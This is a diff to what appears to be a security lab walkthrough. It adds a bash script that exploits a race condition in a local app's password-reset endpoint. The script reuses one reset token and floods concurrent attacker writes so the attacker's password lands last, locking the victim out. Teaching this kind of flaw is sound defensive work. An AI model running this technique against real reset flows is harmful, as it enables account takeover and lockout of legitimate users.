@@ -165,7 +165,37 @@ curl -s -X POST http://localhost:5001/bff/auth/login \
   -d '{"username":"partner","password":"Victim5678!"}' | jq -r '.username // "WRONG"'
 ```
 
-One will print `partner`, the other `WRONG`. In a real attack the attacker retries the race until their write lands last, permanently locking the victim out.
+One will print `partner`, the other `WRONG`. The result is non-deterministic — whichever write lands last wins. If the victim's password wins this round, the attacker lost this attempt. In a real attack the attacker retries with more parallelism to increase the odds their write lands last.
+
+**Increasing the odds — flood with attacker writes:**
+
+Request a fresh token and send many concurrent attacker writes alongside one victim write. The more attacker requests, the higher the chance one lands last:
+
+```bash
+TOKEN=$(curl -s -X POST http://localhost:5001/bff/auth/forgot-password \
+  -H "Content-Type: application/json" \
+  -d '{"username":"partner"}' | jq -r '.resetToken')
+
+# Victim resets their password (one request)
+curl -s -X POST http://localhost:5001/bff/auth/reset-password \
+  -H "Content-Type: application/json" \
+  -d "$(printf '{"token":"%s","newPassword":"Victim5678!"}' "$TOKEN")" > /dev/null &
+
+# Attacker floods with 10 concurrent writes using the same token
+for i in $(seq 1 10); do
+  curl -s -X POST http://localhost:5001/bff/auth/reset-password \
+    -H "Content-Type: application/json" \
+    -d "$(printf '{"token":"%s","newPassword":"Attacker1234!"}' "$TOKEN")" > /dev/null &
+done
+wait
+
+# Check if attacker won
+curl -s -X POST http://localhost:5001/bff/auth/login \
+  -H "Content-Type: application/json" \
+  -d '{"username":"partner","password":"Attacker1234!"}' | jq -r '.username // "lost — retry"'
+```
+
+With 10 attacker writes to 1 victim write, the attacker wins the majority of the time. The victim's account is locked out with a password they never set.
 
 Restore the account before moving on:
 
